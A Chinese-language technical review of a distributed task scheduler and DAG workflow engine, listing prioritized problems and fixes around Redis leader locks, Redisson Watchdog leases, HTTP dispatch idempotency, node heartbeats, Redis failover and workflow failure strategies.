## 一、调度器与多实例

### 1.1 三套调度器并存且 Leader 锁 key 不同（P0）— 已改造（2026-05）

**原问题**

- FIFO 与 ResourceAware 曾同时 `@Scheduled`，且 Leader 锁 key 分裂，导致并行扫库。

**已实现**

- 配置 `scheduler.strategy`：`fifo` | `priority` | `resource-aware`（默认 `resource-aware`）。
- `@ConditionalOnProperty`：运行时 **仅一个** `SchedulerService` 实现生效。
- 唯一定时入口：`SchedulerLoopRunner`（`fixedDelay`，间隔 `scheduler.loop-interval-ms`）。
- 统一 Leader 选举：`SchedulerLeaderElection` + `scheduler.leader-lock-key`（默认 `scheduler:leader:lock`）；**同策略的多 scheduler 实例竞争同一把锁**。

**配置示例**

```yaml
scheduler:
  strategy: resource-aware   # 或 fifo / priority
  loop-interval-ms: 5000
  leader-lock-key: scheduler:leader:lock
  leader-lock-lease-seconds: 30
```

环境变量：`SCHEDULER_STRATEGY=fifo` 等。

**涉及文件**

- `SchedulerProperties`、`SchedulerLeaderElection`、`SchedulerLoopRunner`、`SchedulerConfig`
- `FifoSchedulerServiceImpl`、`PrioritySchedulerServiceImpl`、`ResourceAwareSchedulerServiceImpl`
- `application.yaml`

**仍待做（见 §1.2 / §1.3）**

- Leader 锁已 Watchdog + unlock（§1.2）；单任务调度锁仍见 §1.3。

### 1.2 Leader 锁固定租约 30s、循环结束不 unlock（P1）— 已改造（2026-05）

**原问题**

- `tryLock(0, 30, SECONDS)` 不启用 Watchdog；单轮 `scheduleLoop` 超过 30s 时锁过期，可能双实例并行扫库。

**已实现（方案 A）**

- `SchedulerLeaderElection.tryAcquireLeadership()`：`tryLock(0, -1, TimeUnit.MILLISECONDS)`，持锁期间 **Watchdog 自动续期**。
- `SchedulerLeaderElection.releaseLeadership()`：当前线程持有时 `unlock()`。
- `SchedulerLoopRunner.runScheduleLoop()`：统一 `tryAcquire` → `scheduleLoop()` → **`finally release`**；Fifo / Priority / ResourceAware 不再各自抢 Leader。
- `scheduler.leader-lock-lease-seconds` 标记 **@Deprecated**（配置保留兼容，代码不再使用）。

**涉及文件**

- `SchedulerLeaderElection`、`SchedulerLoopRunner`、`SchedulerProperties`
- `FifoSchedulerServiceImpl`、`PrioritySchedulerServiceImpl`、`ResourceAwareSchedulerServiceImpl`

**仍待做（见 §1.3）**

- 单任务调度锁 `task:schedule:lock` 仍为固定 10s lease，与 Leader 锁独立。

**参考**

- `docs/SCHEDULERS_TECH_AND_ALGORITHMS.md` §1.1.2（文档需与实现对齐 Watchdog）

### 1.3 任务调度锁租约 10s、无 Watchdog（P1）

**现状**

```java
lock.tryLock(1, 10, TimeUnit.SECONDS);  // wait 1s, lease 10s
// finally unlock
```

- 单任务路径含：配额检查、选点、槽位预留、乐观锁更新、HTTP 下发；若 **> 10s**，锁过期后第二实例可能进入同一 `scheduleTask`，与第一实例的 `reserve` / 状态更新产生竞态（乐观锁与 usage 流水可缓解，但不应依赖偶发成功）。

**建议**

- 缩短关键路径或 `leaseTime=-1` + Watchdog + `finally unlock`。
- 监控单任务调度耗时 P99，作为租约调参依据。

---

### 1.4 内存削峰队列非分布式（P1）

**现状**

- `TaskSubmitService` 使用 **进程内队列** 批量落库；scheduler 多实例时各实例队列独立。

**问题**

- 实例重启 **未落库任务丢失**。
- 无法全局削峰与统一背压。

**建议**

- 短期：文档标明「提交接口需幂等 + 客户端重试」。
- 中期：Redis List / Stream、或 DB `SUBMITTING` 中间态 + 异步落库消费者。

---

### 1.5 FIFO 选点与优先级选点过于简单（P2）

**现状**

- FIFO / Priority：`selectNode` 固定取 **id 最小的 ONLINE 节点**。
- ResourceAware：Best Fit 多维打分。

**问题**

- 前两套在多 worker 下 **热点节点**、利用率差；与「资源感知」产品定位不一致。

**建议**

- 非 ResourceAware 模式至少支持轮询 / 随机 / 按 `availableCpu` 粗选。
- 或废弃 FIFO/Priority 的独立选点，统一走 `selectBestNode` 门面。

---

### 1.6 优先级 aging 偏弱，低优先级可能长期饥饿（P2）

**现状**

```text
effectivePriority = 10 × (priority/10) + 0.1 × (等待小时数)
```

- CRITICAL(10) 与 LOW(3) 基础分差约 7，需约 **70 小时** 等待才能靠 aging 追平。

**建议**

- 提高 `AGING_WEIGHT`、或引入 **最大等待 SLA**（超时自动提升优先级）。
- 多级队列（高/中/低）+ 每级时间片。

## 二、任务下发与 HTTP 回调

### 2.0 「不重复执行」分层语义与缺口（经典面试题映射）

**应先声明**：本项目目标是 **At-most-once 调度占用 + At-least-once 传输倾向 + 执行侧未完全幂等**，**不是**端到端 Exactly-once。

| 阶段 | 手段 | 保证到什么程度 | 缺口 |
|------|------|----------------|------|
| 多实例同时调度 | `task:schedule:lock:{id}` + 再读 PENDING | 尽量互斥 | 锁过期 / Redis failover 窗口 |
| 状态只迁一次 | `updateStatusWithVersion`（PENDING→RUNNING） | **同一实例不会双 RUNNING** | 不阻止两次 HTTP 下发 |
| 资源不双占 | `resource_usage` 非 RELEASED 禁止再 reserve | **同 taskInstance 不会双预留** | 与执行次数无直接对应 |
| 回调写状态 | `transitionStatus` 终态幂等 + 迟到 Worker 忽略 | **终态不被覆盖** | 回调无重试，可能长期 RUNNING |
| Worker 执行 | **无**「已接受则 200」去重 | **重复 POST 可能起两个子进程** | `RunningTaskRegistry.put` 会覆盖句柄 |
| 提交幂等 | `instance_code` 字段存在 | **未在提交 API 强制唯一** | 客户端重试可能多条 instance |

**面试口径**：「我们用 DB 乐观锁保证调度状态单写，用槽位保证资源单占；远程执行按 At-least-once 设计，Worker 必须按 `taskInstanceId` 做执行幂等，目前 Worker 侧待补。」

---

### 2.1 远程链路无「恰好一次」保证（P0）

**现状**

- 下发：`scheduler → POST /api/worker/runs` → **202 即视为接受**。
- 结果：`SchedulerCallbackClient` **单次 POST**，失败仅打日志 **无重试**。
- 下发失败：`rollbackAfterDispatchFailure` → PENDING + 释放预留（可重试）。
- 下发成功但回调丢失：任务长期 **RUNNING**，依赖 `TaskTimeoutWatchdog` → TIMEOUT（可能 **误判**，worker 实际已成功）。

**建议**

- Worker 回调：**指数退避重试 + 本地死信表**（`taskInstanceId`、目标 URL、body 持久化）。
- Scheduler：回调接口支持 **幂等键**（已有终态忽略迟到回调，可加强 `Idempotency-Key`）。
- 可选：**Outbox 表**（状态变更与「待回调事件」同事务写入，后台投递）。
- 明确语义文档：**At-least-once 执行 + 业务幂等**，而非 exactly-once。

**涉及文件**

- `SchedulerCallbackClient`、`WorkerRunService`、`TaskInstanceServiceImpl`、`TaskTimeoutWatchdog`

---

### 2.2 dispatch 成功回滚与 Worker 幽灵执行（P0）

**场景**

- HTTP 202 已返回，随后 scheduler 侧 `submitToExecutor` 判失败并回滚 PENDING；或网络超时导致 scheduler 认为失败而 worker 已执行。
- Scheduler **网络重试**（若未来 RestClient 加重试）或 **PENDING 回滚后再调度**：可能对同一 `taskInstanceId` 再次 `POST /api/worker/runs`。
- Worker **无幂等**：`WorkerRunController` 一律 `202 accepted` + `submitAsync`，不检查是否已在跑。

**建议**

- Worker 执行前写 **本地「已接受」流水**（`taskInstanceId` 唯一）；重复下发返回 **200/409** 且 **不再** `executeSync`。
- 内存态：`RunningTaskRegistry` 在 `register` 前 `putIfAbsent`，已存在则拒绝第二次执行。
- Scheduler 回滚前可尝试 **cancel**（已有 `WorkerHttpClient.cancelRun`），并与状态机联动。
- 对账任务：扫描「PENDING 但有 RESERVED usage」或「RUNNING 无活跃 worker 进程」的异常集。

---

### 2.3 选用 HTTP 而非 MQ 的局限（P2，架构备忘）

**现状**

- 控制面 **Push** 到指定 worker；适合当前规模与部署简单性。

**局限**

- 无 broker 级持久化与消费组背压；弱网依赖超时与 PENDING 重调度。

**演进**

- 任务量大、跨机房时：引入 **任务下发 Topic** + worker 消费幂等（`taskInstanceId`），HTTP 保留为兼容层。

---

### 2.4 `scheduler-public-base-url` 配置易错（P1）

**现状**

- 远程模式必须配置 `task.executor.scheduler-public-base-url`，否则无法构造 Worker 回调 URL。

**建议**

- 启动校验（remote 模式缺失则 fail-fast）。
- 支持注册时由 scheduler 返回 **回调基址** 模板，减少多网卡/容器环境配错。

## 三、资源感知与节点管理

### 3.1 心跳未上报真实资源，与槽位账本双轨（P1）

**现状**

- Worker 心跳将配置的 **`total*` 当作 `available*`** 上报，非 OS/cgroup 实时剩余。
- **调度选点**（`canFit` / Best Fit）读 `resource_node.available*`。
- **防超卖** 读 `resource_slot` 条件扣减 + `resource_quota`。

**问题**

- 心跳可能 **覆盖** `resource_node` 快照，与 `resource_slot` 已预留量 **不一致** → Best Fit 过于乐观；真正拦截在 `reserve` 阶段，表现为 **多次 skip、调度延迟**。
- 无法感知节点上 **非本平台进程** 占用的 CPU/内存。

**建议**

- 心跳上报 **真实可用量**（或不再更新 `available*`，仅更新 `last_heartbeat_time`，以 **slot 为唯一调度账本**）。
- 定期 **对账**：`resource_node` 展示值 = `total - sum(reserved_slot)`。
- Worker 侧采集：OS metrics 或容器 cgroup。

**涉及文件**

- `SchedulerNodeClient`、`ResourceServiceImpl`、`ResourceSlotServiceImpl`、`ResourceAwareSchedulerServiceImpl`

---

### 3.2 节点失效判定依赖手工 API，非自动（P1）

**现状**

- `POST /api/resource/internal/offline-timeout?heartbeatTimeoutSeconds=`（默认 **60s**）需 **JWT 调用**。
- **无** scheduler 内置 `@Scheduled` 扫描超时节点。
- 文档部分写「5 分钟超时」，与代码默认 **60s** 不一致。

**问题**

- 未配置定时调用时，Worker 宕机后节点可能 **长期 ONLINE**，调度器仍尝试 HTTP 下发（失败回滚，但浪费周期）。

**建议**

- 新增 `NodeHeartbeatWatchdog`：`fixedDelay` 调用 `offlineTimeoutNodes`。
- 参数统一：`worker.heartbeat-interval-seconds`（默认 30）与 `scheduler.node.heartbeat-timeout-seconds`（建议 ≥ 3× 心跳间隔）。
- 更新 `DATABASE_DESIGN.md` / `BUSINESS_LOGIC.md` 与代码一致。

---

### 3.3 Worker 宕机后 RUNNING 任务无驱逐/重调度（P1）

**现状**

- 节点 OFFLINE 后：**不**自动取消该节点上 RUNNING 任务。
- 依赖 `TaskTimeoutWatchdog` 按 `task.timeout_seconds` 标 TIMEOUT + `cancel` 尝试。
- `resource_usage` 在任务终态前保持 RESERVED。

**与 K8s 差异**

- 无 Node NotReady → Pod 驱逐 → 其他节点重建。

**建议**

- 节点下线时：扫描 `resource_node_id = 该节点 AND status = RUNNING`，标记 FAILED/TIMEOUT（原因 `NODE_OFFLINE`），释放槽位，并触发工作流失败策略。
- 可选：支持 **自动重试到其他节点**（新 task_instance 或 FAILED→PENDING 重试）。

---

### 3.4 节点 OFFLINE 与 resource_slot 未联动（P2）

**现状**

- `offlineTimeoutNodes` 仅改 `resource_node.status`。
- 已预留槽位不因节点下线自动释放（需任务终态 `release`）。

**建议**

- 明确策略：OFFLINE 时是否 **冻结新预留**（已满足）、是否 **批量释放** 该节点 RESERVED（需与任务状态联动，避免双释）。

---

### 3.5 调度器内 `reserve` 与租户 JWT 上下文（P1，待核实）

**现状**

- `ResourceSlotServiceImpl.reserve` 走 `tenantAccessGuard.requireTenantMember`。
- 调度循环为 **系统后台线程**，可能 **无用户 JWT**。

**建议**

- 确认生产路径是否已打通；若未打通，增加 **`reserveSystemInternal`**（仅内部调用、校验 taskInstanceId 归属租户），避免调度器预留始终失败。
- 集成测试覆盖「无 SecurityContext 下 ResourceAware 完整调度」。

## 四、Redis 与分布式锁

> 本节说明：**为何用 Redis 锁而非数据库锁**、**Redis 锁风险**、**主从切换影响**，以及与本项目实现的差距。

### 4.0 为何选择 Redis 分布式锁，而不是数据库锁？

**本项目实际分层**（见 `P3-5_CONCURRENCY_SAFETY_DESIGN.md`）：

| 层次 | 手段 | 作用 |
|------|------|------|
| 调度互斥 | **Redis（Redisson `RLock`）** | Leader 选举、单任务 `task:schedule:lock:{id}` |
| 资源/配额防超卖 | **MySQL 条件 UPDATE** | `resource_slot.decreaseIfEnough`、`resource_quota.consumeIfWithinQuota` |
| 状态终态 | **MySQL 乐观锁** | `task_instance.version` |

也就是说：**锁在 Redis，账本与真相在 MySQL**，并不是「全靠 Redis 保证一致性」。

**选用 Redis 做调度锁的常见理由（与本项目契合）**

1. **基础设施已依赖 Redis**：工作流完成 Stream、分布式缓存失效同一集群；再加 DB 锁会多一套锁表与轮询逻辑，运维面不统一。
2. **锁粒度细、持有时间短**：`task:schedule:lock:{taskInstanceId}` 按任务隔离，不同任务可并行；数据库行锁若锁在 `task_instance` 行上，常与「读 PENDING 列表 + 更新」绑在同一连接事务里，易拉长事务、占用连接池。
3. **性能与调度周期匹配**：约 5s 一轮、每轮最多 100 条 PENDING；Redis 单次 `tryLock` 延迟低，适合「抢不到就 skip 下轮」而非阻塞排队。
4. **租约语义**：`tryLock(wait, lease, SECONDS)` 可在进程崩溃后靠 TTL 自动释放，避免 DB 会话断开才能释放的死锁（需正确配置 lease / Watchdog，见 4.2）。
5. **与设计稿一致**：`REDIS_DESIGN.md`、`P3-5` 将 Leader/任务锁明确为 Redisson 场景。

**数据库锁适合什么？本项目为何没把调度锁全放 DB？**

| 数据库方案 | 优点 | 在本项目中的顾虑 |
|------------|------|------------------|
| `SELECT … FOR UPDATE`（悲观） | 与状态更新同事务，强一致 | 调度扫描多行 PENDING 时不宜长事务；跨实例需锁到具体行，Leader 选举无天然「一行」 |
| `GET_LOCK(name)` /  advisory lock | 实现简单 | 连接绑定；集群下连接漂移；锁名全局、难细粒度 |
| **租约表**（`scheduler_lease` 插入/续期） | 不依赖 Redis；可审计 | 需续期线程 + 清理过期租约；实现与运维成本高于已有 Redisson |
| **乐观锁 only** | 已有 `version` | 只能保证「一次 PENDING→RUNNING」；无法避免两实例同时 `reserve`、重复 HTTP 下发前的长路径竞态 |

**结论**：当前是 **Redis 协调 + DB 权威** 的混合模型；数据库已承担「不能超卖、不能双写状态」的硬约束，Redis 承担「尽量别同时进调度临界区」的软互斥。若 Redis 不可用，应假定 **协调层失效**，而不是假设 DB 锁已替代 Redis。

**演进建议（P2）**

- 关键路径文档写明：**最终以 `updateStatusWithVersion` + `resource_slot` 为准**。
- 可选增加 **`scheduler_lease` 表** 作 Leader 兜底，或与 Redis 锁「二选一」可配置。

---

### 4.1 Redis 单点依赖，无降级（P0）

**现状**

- Leader 锁、任务锁、工作流 Stream、分布式缓存均依赖 Redis。

**Redis 不可用**

- 调度循环大面积 skip；DAG 推进停滞；锁失效后仅靠 DB 乐观锁，风险上升。

**建议**

- 基础设施：哨兵/集群 + 监控告警。
- 应用：Redis 健康检查 + 调度熔断指标；关键路径文档化 **降级策略**（只读 API 可用、暂停提交等）。
- 长期：Leader 可选 **DB 租约表**；任务互斥继续依赖 DB 乐观锁 + 槽位原子扣减（见 4.0）。

---

### 4.2 未使用 Redisson Watchdog（P1）

**现状**

- 所有 `tryLock(wait, lease, unit)` 的 `leaseTime` 均为 **正数**（10s / 30s）→ **不启用 Watchdog**。
- 设计稿 `P3-5` / `REDIS_DESIGN.md` 描述 Leader 锁可由 Watch Dog 续期，**与代码不一致**。

**建议**

- Leader 锁与长耗时临界区改为 `leaseTime=-1` + 显式 `unlock`，或调大租约并监控过期事件。
- 同步修订设计文档，避免「文档有 Watchdog、实现无续期」的误解。

---

### 4.3 工作流缓存与 Stream 同集群故障域（P2）

**现状**

- Redis 故障同时影响锁、Stream、缓存。

**建议**

- 关键 Stream 消费：**Pending 列表监控 + 人工 ACK** 工具（细节与代码缺口见 **§5.4**）。
- 缓存失效可回源 DB，避免与锁混用同一实例无隔离时的雪崩。
- DAG 推进勿假设 Stream 必达（**§5.1** 终态双写/扫库补偿）。

### 4.4 Redis 分布式锁的主要风险（总览）

| 风险 | 说明 | 本项目暴露点 | 缓解（已有 / 待做） |
|------|------|--------------|---------------------|
| **Redis 进程/网络故障** | 拿不到锁 → 不调度；或极端下多实例同时认为无锁 | 调度 skip、DAG 停 | 已有：DB 乐观锁 + 槽位 SQL；待做：熔断告警、Redis HA |
| **固定 lease 过期** | 临界区未结束锁已释放，双实例进入 | Leader 30s、任务 10s，循环未 unlock Leader | 待做：Watchdog 或调大 lease + finally unlock |
| **未启用 Watchdog** | 与设计稿不符，长 GC/慢 SQL 放大风险 | 见 4.2 | `leaseTime=-1` 或续期 |
| **Leader 锁未主动释放** | 依赖 TTL；过期窗口内可能双主 | `tryAcquireLeadership` 无 `unlock` | 单 Leader key + 租约监控 |
| **多套 Leader key** | 非互斥「Leader」，并行扫库 | FIFO / ResourceAware 不同 key | 见 §1.1 |
| **主从切换锁丢失** | 见 4.5 | 生产若主从异步复制 | `min-replicas-to-write`、Redisson 哨兵/集群模式 |
| **误解锁语义** | 以为 Redis 锁 = 任务只执行一次 | 202 已接受后仍可能重试下发 | Worker 幂等 + 状态机 |
| **unlock 误用** | 非持有线程解锁 | 当前 `isHeldByCurrentThread` 较规范 | 保持规范；避免异步线程 unlock |

### 4.5 主从切换（Failover）会怎样？（P0 / P1）

**背景**

- Redisson 在**单 Redis 主节点**上通过 **Lua 脚本** 保证加锁/解锁原子性（当前 `application.yaml` 为单机 `host/port` 形态）。
- 经典问题：客户端在 **Master** 上加锁成功，Master 宕机前锁 key **尚未复制到 Replica**，Sentinel 提升 Replica 为新 Master → 新 Master 上 **无锁记录**，另一 scheduler 实例可再次加锁成功。

**在本项目中的可能影响**

| 场景 | 可能后果 | 现有兜底 |
|------|----------|----------|
| **双 Leader（同 Leader key）** | 两轮 `scheduleLoop` 并行扫 PENDING | 任务锁 `task:schedule:lock:{id}`；单任务仍互斥 |
| **双任务锁失效窗口** | 两实例同时 `reserve` + 改状态 | `updateStatusWithVersion` 仅一方成功；`resource_usage` 阻塞重复 reserve |
| **Leader 已过期 + 切换叠加** | 三实例同时调度 | 同上；日志冲突、无效 reserve 增多 |
| **Stream / 缓存** | 丢事件、脏缓存 | 与锁独立；需 Stream 待 ACK 与缓存 TTL 策略 |

**不会出现（若 DB 路径正常）**

- 同一 `task_instance` 两次成功 `PENDING→RUNNING`（乐观锁）。
- 槽位/配额 **条件 UPDATE** 层面的超卖（与 Redis 锁是否丢失无关）。

**仍可能出现**

- 同一任务 **两次 HTTP 下发**（一方已 RUNNING，另一方回滚失败或幽灵执行，见 §2.2）。
- 工作流 **重复消费/漏消费** Stream（与锁 failover 叠加时需单独治理）。

**生产建议（写入运维基线）**

1. Redis：**哨兵或 Cluster** + Redisson 对应配置；主从复制优先 **半同步**（如 `min-replicas-to-write 1` + 合理 `min-replicas-max-lag`），缩小「锁未复制就宕机」窗口。
2. 应用：启用 **Watchdog** 或缩短调度临界区，减少「持锁时间 × failover」交叉。
3. 架构：**单一 Leader key + 单调度策略**（§1.1）；降低并行扫库概率。
4. 可选：**RedLock**（多独立 Redis 节点）—— Redisson 提供 `RedissonRedLock`，但运维成本高；多数团队更倾向 **Cluster + 半同步复制 + DB 兜底**。
5. 对账：监控 **乐观锁冲突率、同 taskInstanceId 多次 dispatch 日志、version 冲突**。

**文档债（P2）**

- `P3-5`、`REDIS_DESIGN.md` 默认「Watch Dog 自动续期」，代码未启用 → 需在部署文档标明 **failover 与 lease 的真实行为**。

### 4.6 数据库锁与 Redis 锁的职责再划分（建议目标态）

```
调度临界区进入：
  优先 Redis tryLock（快速、细粒度）
       ↓ 失败则 skip
  DB：配额 consume + 槽位 decrease + version 状态迁移（权威）
       ↓
  远程下发 / 回调（At-least-once，幂等）

Redis 故障时：
  暂停调度或仅允许「DB 租约 Leader + 乐观锁」降级模式（显式配置，非静默双写）
```

## 五、工作流与事件驱动

> **DAG 推进链路**：Worker 回调 → `TaskInstanceServiceImpl` 写库 → `TaskCompletionEventPublisher` **XADD** → `TaskCompletionStreamListener` **XREADGROUP** → `TaskCompletionStreamHandler` → `WorkflowLayerDispatchFacade.onWorkflowTaskTerminated` → 下一层 `dispatchLayer`。  
> Stream Key：`task-completion`；Consumer Group：`dag-engine-group`（每 JVM 一个 `dag-engine-{uuid}` consumer）。

### 5.1 DAG 推进强依赖「回调 + Stream」，无 DB 兜底扫描（P0 / P1）

**现状**

- 工作流层间推进 **仅** 在 `task_instance` 进入终态后发布 Stream 事件触发；已移除定时扫 `RUNNING` 的兜底（见 `REDIS_STREAM_EVENT_DRIVEN_UPGRADE.md`）。

**问题（按严重度）**

| 场景 | 后果 | 说明 |
|------|------|------|
| **Worker 回调丢失/不可达** | `task_instance` 长期 RUNNING；**无 Stream 事件** | `TimeoutWatchdog` 可能把单任务标 TIMEOUT，但 **`workflow_task_instance` 与工作流实例状态可能长期不同步**，下一层永不触发 |
| **XADD 失败** | DB 已终态，DAG **不推进** | `TaskCompletionEventPublisher.publish` 仅 `log.error`，**无 outbox、无同步调用 Facade** |
| **`workflowInstanceId` 为空** | 事件被静默跳过 | `TaskCompletionStreamHandler` 对 `workflowInstanceId == null` 直接 `return`；若提交任务时未带上工作流实例 ID，整条 DAG 链断 |
| **Redis 整体不可用** | 发布/消费均失败 | 与 Leader 锁、执行计划缓存 **同一故障域**（§4.3）；DAG 推进与调度同时受损 |

**建议**

1. **终态双写**：`transitionStatus` 成功落库后，**同步**调用 `WorkflowLayerDispatchFacade`（或事务提交后监听器），Stream 作加速通道而非唯一路径。
2. **补偿任务**：`@Scheduled` 扫描「`task_instance` 已终态且 `workflow_task_instance` 仍为 RUNNING」或「当前层应已全部终态但 `workflow_instance` 未推进」。
3. **发布可靠性**：本地 outbox 表 + 异步重试 XADD；或发布失败时立即走同步推进。
4. 提交工作流层任务时 **强制校验** `TaskSubmitRequest.workflowInstanceId` 非空。

**涉及文件**

- `TaskInstanceServiceImpl`、`TaskCompletionEventPublisher`
- `TaskCompletionStreamHandler`、`WorkflowLayerDispatchFacade`
- `TaskSubmitService` / `WorkflowLayerDispatchFacade.dispatchLayer`

### 5.2 DAG 节点失败、失败策略与重试恢复（P0 / P1）

#### 5.2.1 实际行为（代码路径）

**单节点失败时（Worker 回调 FAILED / TIMEOUT / CANCELLED）**

```
TaskInstanceServiceImpl.transitionStatus(终态)
  → TaskCompletionEventPublisher (Stream)
  → TaskCompletionStreamHandler.handleTaskFailure
       · workflow_task_instance → FAILED
       · workflow_instance.failed_tasks++
       · WorkflowLayerDispatchFacade.onWorkflowTaskTerminated  ← 与成功路径相同
```

**当前层收口**（`WorkflowLayerDispatchFacade.onWorkflowTaskTerminated`）

- 仅判断该层 **是否全部进入终态**（`SUCCESS` / `FAILED` / `SKIPPED` 等），**不区分成功或失败**。
- 一层内既有成功又有失败时，只要 **全部终态**，仍会 `proceedAfterLayerFinished` → **提交下一层**。

**工作流实例终态**（`completeWorkflowInstance`）

- 所有层跑完后：若 `failedTasks > 0` → **`PARTIAL_SUCCESS`**；否则 → **`SUCCESS`**。
- **`WorkflowInstanceStatus.FAILED`** 仅在 **启动阶段异常**（`WorkflowExecutorImpl.failWorkflowInstance`，如解析 execution_plan 失败）时设置，**不会因运行中某节点失败而自动变为 FAILED**。

#### 5.2.2 与「设计意图」的差距（P0）

| 能力 | 设计/枚举/文档 | 代码现状 |
|------|----------------|----------|
| **`FailureStrategy.STOP_ON_FAILURE`** | 创建实例可传，默认 `stop_on_failure`；`WorkflowInstance.failureStrategy` 落库 | **运行时无任何读取**（全仓库无 `getFailureStrategy()` 调用） |
| **`CONTINUE_ON_FAILURE`** | 失败后继续，最终 `PARTIAL_SUCCESS` | 与上相同：实际 **始终** 在层全部终态后推进下一层 |
| **失败后停止下游** | STOP 语义 | **未实现**：失败节点所在层结束后仍可能调度下游 |
| **工作流 FAILED** | 枚举注释：STOP 策略下终止 | 正常跑完含失败任务 → 几乎总是 **`PARTIAL_SUCCESS`**，很少 **`FAILED`** |

**结论（面试可直说）**：节点失败 → **该 `workflow_task_instance` 标 FAILED**；**整流默认不会因单点失败而停**（除非启动失败）；**不会**按 `failureStrategy` 分支；跑完全图后多为 **部分成功**。

#### 5.2.3 重试：两层语义

| 层级 | 机制 | 是否自动 | 说明 |
|------|------|----------|------|
| **调度任务 `task_instance`** | 状态机允许 `FAILED/TIMEOUT → PENDING`，受 `Task.retryTimes` 限制 | **否** | `TaskInstanceServiceImpl` 仅在校验流转时检查次数；**调度器/Watchdog 不会在失败后自动打回 PENDING** |
| **工作流节点 `workflow_task_instance`** | `WorkflowControlServiceImpl.retryFailedTasks` / `retryTask` | **手动 API** | 将 FAILED 节点重置为 `PENDING`、清空 `taskInstanceId`、`retryCount++`，实例改 `RUNNING` 后 `resumeWorkflowInstanceAsync` |
| **DAG 节点 `RetryPolicy` / `retryOverride`** | `WorkflowTask` 模型字段 | **未接线** | 提交层任务时未合并到 `TaskSubmitRequest` |

**已暴露 HTTP**

- `POST /api/workflow-instances/{id}/retry-failed` → `retryFailedTasks`（要求实例 **`FAILED` 或 `PARTIAL_SUCCESS`**）。

**未暴露 HTTP（仅有 Service）**

- `skipFailedTasks`：标记 FAILED → `SKIPPED`，**不调用** `onWorkflowTaskTerminated` / `resumeWorkflowInstanceAsync`，**无法单独靠跳过解开「层卡住」**。
- `retryTask(workflowTaskInstanceId)`：单节点重试，**无 Controller**。

#### 5.2.4 如何恢复（运维/用户）

| 场景 | 可行操作 | 注意 |
|------|----------|------|
| 实例已结束且含失败（`PARTIAL_SUCCESS`） | `POST .../retry-failed` | 所有 FAILED 节点重置为 PENDING 并重新投递最浅层 Pending |
| 实例启动失败（`FAILED`） | 查日志修 DAG/计划后 **重新创建实例** 或扩展「从失败层重启」 | 当前无「从第 N 层恢复」专用 API |
| 实例仍 `RUNNING`、某节点已 FAILED 但下游已跑 | **无 STOP 语义** | 属 §5.2.2 缺陷；只能 **取消实例** 或等跑完后 `retry-failed` |
| 回调/Stream 丢失导致层不推进 | §5.1 补偿扫库 | 与节点失败无关 |
| 暂停后继续 | `resume` → 只投递仍 **PENDING** 的节点 | 已成功/失败节点不重复执行 |

**层内提交失败**（`dispatchLayer` catch）：该 `workflow_task_instance` 直接标 FAILED 并 `incrementFailedTasks`，**不经过 Stream**；若同层其它任务未终态，需等同层其它任务结束才会收口。

#### 5.2.5 其它边界

- **`TIMEOUT` / `CANCELLED`**：在 Stream Handler 中与 FAILED 走同一路径，工作流节点记为 **FAILED**（取消语义未单独映射为 SKIPPED）。
- **`handleTaskSuccess` 使用 `incrementCompletedTasks`**：失败用 `incrementFailedTasks`；与实例级 `successTasks`/`failedTasks` 统计相关，重试前未回滚计数（重试只重置节点状态）。
- **条件分支（P4-4）**：`WorkflowConditionalLayerGate` 已实现部分门前逻辑，与失败策略 **独立**；文档需区分「条件跳过」与「失败策略」。

**建议（实现优先级）**

1. **P0**：在 `onWorkflowTaskTerminated` / `handleTaskFailure` 读取 `workflow_instance.failureStrategy`：`STOP_ON_FAILURE` 时置实例 `FAILED`、**不再** `dispatchLayer` 下一层，可选取消同层 RUNNING。
2. **P1**：`CONTINUE_ON_FAILURE` 保持现状但显式文档化；终态统一：`STOP` → `FAILED`，`CONTINUE` 且有失败 → `PARTIAL_SUCCESS`。
3. **P1**：`skipFailedTasks` 暴露 API，并在跳过后调用 **层收口推进**（与 `retry-failed` 对称）。
4. **P2**：调度器侧 **自动重试**（`FAILED→PENDING`，尊重 `retryTimes` + `retryInterval`）；DAG `RetryPolicy` 合并进提交。
5. **P2**：条件分支能力矩阵（原 §5.2 产品化项）。

**涉及文件**

- `TaskCompletionStreamHandler`、`WorkflowLayerDispatchFacade`、`WorkflowExecutorImpl`
- `WorkflowControlServiceImpl`、`WorkflowInstanceController`
- `FailureStrategy`、`WorkflowInstance`、`TaskInstanceServiceImpl`
- `WorkflowConditionalLayerGate`（条件，非失败策略）

### 5.3 大规模 DAG：拓扑 O(V+E) 可接受，但「全量物化」成为瓶颈（P2）

**背景（算法 vs 工程）**

- 分层 Kahn 拓扑排序本身为 **O(V + E)**（V=节点数，E=依赖边数），对千级节点在单机毫秒级通常足够。
- 当前瓶颈不在排序循环，而在 **执行计划全量构建、序列化、缓存与反复反序列化**。

**现状**

| 环节 | 行为 | 大图风险 |
|------|------|----------|
| **定义校验** | `WorkflowServiceImpl.validateDAG`：DFS 三色法检环（创建/更新时） | 与排序重复检环，但仅一次；无 `maxNodes` / `maxEdges` / JSON 大小上限 |
| **执行计划** | `WorkflowExecutionServiceImpl.doBuildExecutionPlan`：Kahn 分层 + 每层展开完整 `WorkflowTask` | 同步阻塞；实例创建 API 延迟随 V 线性上升 |
| **环检测（二次）** | `topologicalSort`：`visited.size() != graph.size()` 抛错 | 与 DFS 语义重复；大图仍要跑完整 Kahn |
| **实例持久化** | `WorkflowInstance.executionPlan` 存 **整份** `WorkflowExecutionPlan` JSON | 单行 JSON 膨胀；MySQL `TEXT`/`JSON` 读写与备份成本上升 |
| **运行时解析** | `WorkflowExecutorImpl`、`WorkflowLayerDispatchFacade`、`WorkflowConditionalLayerGate` 等多次 `readValue(executionPlan)` | 每层推进/条件判断都反序列化 **全图**，CPU 与 GC 压力随实例数 × 层数放大 |
| **缓存** | L1 Caffeine `maximumSize=500` + L2 Redis 存 **完整计划** | 按 **工作流条数** 限流，非按内存权重；少数超大 DAG 可占满 Redis/堆 |
| **并行语义** | 一层内节点无依赖，由调度器并行下发 | 宽 DAG（单层数百节点）会瞬时打满 PENDING 队列与调度循环 |

**涉及文件**

- `WorkflowServiceImpl`（`detectCycle` / `validateDAG`）
- `WorkflowExecutionServiceImpl`（`topologicalSort`、`buildExecutionPlan`）
- `DistributedWorkflowCacheManager`
- `WorkflowInstanceServiceImpl`（`executionPlan` 序列化）
- `WorkflowLayerDispatchFacade`、`WorkflowExecutorImpl`

**建议（按投入递增）**

1. **准入**：`validateDAG` 增加 `scheduler.workflow.max-nodes`、`max-edges`、`max-dag-json-bytes`（可配置），超限拒绝创建/更新。
